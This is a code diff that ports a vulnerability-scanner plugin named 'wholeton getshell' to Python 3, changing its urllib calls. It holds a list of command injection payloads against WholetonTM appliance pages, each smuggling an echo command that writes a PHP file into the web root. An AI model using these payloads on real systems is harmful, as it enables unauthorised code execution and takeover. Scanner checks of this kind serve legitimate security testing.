@@ -4,7 +4,7 @@
 #_PlugName_ = wholeton getshell
 
 import random
-import urllib
+import urllib.request, urllib.parse, urllib.error
 
 def assign(service, arg):
 	if service == 'wholeton':
@@ -15,7 +15,7 @@ def audit(arg):
     #No.2 http://www.wooyun.org/bugs/wooyun-2010-0103774
     #No.3 http://www.wooyun.org/bugs/wooyun-2010-0103676
     payloads = ["base/stats/realtime/user_prohibit_internet.php?ip=1.1.1.1;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
-                "base/stats/realtime/underLineUser.php?action="+urllib.quote('允许上网')+"&identifier[]=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
+                "base/stats/realtime/underLineUser.php?action="+urllib.parse.quote('允许上网')+"&identifier[]=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                 "base/vpn/download_nodes.php?file=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                 "base/tpl/delectSSL.php?id=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                 "base/user/offLine.php?user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
